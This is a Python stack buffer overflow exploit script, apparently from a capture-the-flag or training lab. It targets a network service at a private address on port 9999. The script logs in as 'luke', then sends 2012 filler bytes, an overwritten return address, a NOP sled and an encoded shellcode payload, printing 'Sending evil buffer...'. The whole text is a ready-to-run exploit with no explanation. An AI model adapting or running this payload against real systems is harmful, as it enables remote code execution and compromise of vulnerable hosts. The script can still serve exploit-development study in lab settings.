#!/usr/bin/env python3

import socket

ip = "10.10.194.54"
port = 9999

uname = "luke"
prefix = ""
offset = 2012 
overflow = "A" * offset
retn = "\x1b\x15\x50\x62"
padding = "\x90" * 16
payload = ("\xd9\xc0\xba\x23\xfa\xab\xba\xd9\x74\x24\xf4\x5e\x31\xc9"
"\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x75\xe9\x49\x4f\x85"
"\xe5\x0c\xb0\x75\xf6\x70\x38\x90\xc7\xb0\x5e\xd1\x78\x01"
"\x14\xb7\x74\xea\x78\x23\x0e\x9e\x54\x44\xa7\x15\x83\x6b"
"\x38\x05\xf7\xea\xba\x54\x24\xcc\x83\x96\x39\x0d\xc3\xcb"
"\xb0\x5f\x9c\x80\x67\x4f\xa9\xdd\xbb\xe4\xe1\xf0\xbb\x19"
"\xb1\xf3\xea\x8c\xc9\xad\x2c\x2f\x1d\xc6\x64\x37\x42\xe3"
"\x3f\xcc\xb0\x9f\xc1\x04\x89\x60\x6d\x69\x25\x93\x6f\xae"
"\x82\x4c\x1a\xc6\xf0\xf1\x1d\x1d\x8a\x2d\xab\x85\x2c\xa5"
"\x0b\x61\xcc\x6a\xcd\xe2\xc2\xc7\x99\xac\xc6\xd6\x4e\xc7"
"\xf3\x53\x71\x07\x72\x27\x56\x83\xde\xf3\xf7\x92\xba\x52"
"\x07\xc4\x64\x0a\xad\x8f\x89\x5f\xdc\xd2\xc5\xac\xed\xec"
"\x15\xbb\x66\x9f\x27\x64\xdd\x37\x04\xed\xfb\xc0\x6b\xc4"
"\xbc\x5e\x92\xe7\xbc\x77\x51\xb3\xec\xef\x70\xbc\x66\xef"
"\x7d\x69\x28\xbf\xd1\xc2\x89\x6f\x92\xb2\x61\x65\x1d\xec"
"\x92\x86\xf7\x85\x39\x7d\x90\xa3\xb6\x7a\xc3\xdc\xca\x84"
"\x12\x41\x42\x62\x7e\x69\x02\x3d\x17\x10\x0f\xb5\x86\xdd"
"\x85\xb0\x89\x56\x2a\x45\x47\x9f\x47\x55\x30\x6f\x12\x07"
"\x97\x70\x88\x2f\x7b\xe2\x57\xaf\xf2\x1f\xc0\xf8\x53\xd1"
"\x19\x6c\x4e\x48\xb0\x92\x93\x0c\xfb\x16\x48\xed\x02\x97"
"\x1d\x49\x21\x87\xdb\x52\x6d\xf3\xb3\x04\x3b\xad\x75\xff"
"\x8d\x07\x2c\xac\x47\xcf\xa9\x9e\x57\x89\xb5\xca\x21\x75"
"\x07\xa3\x77\x8a\xa8\x23\x70\xf3\xd4\xd3\x7f\x2e\x5d\xf3"
"\x9d\xfa\xa8\x9c\x3b\x6f\x11\xc1\xbb\x5a\x56\xfc\x3f\x6e"
"\x27\xfb\x20\x1b\x22\x47\xe7\xf0\x5e\xd8\x82\xf6\xcd\xd9"
"\x86")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.recv(1024)
  s.send(bytes(uname + "\r\n", "latin-1"))
  s.recv(1024)
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  s.recv(1024)
  print("Done!")
except:
  print("Could not connect.")
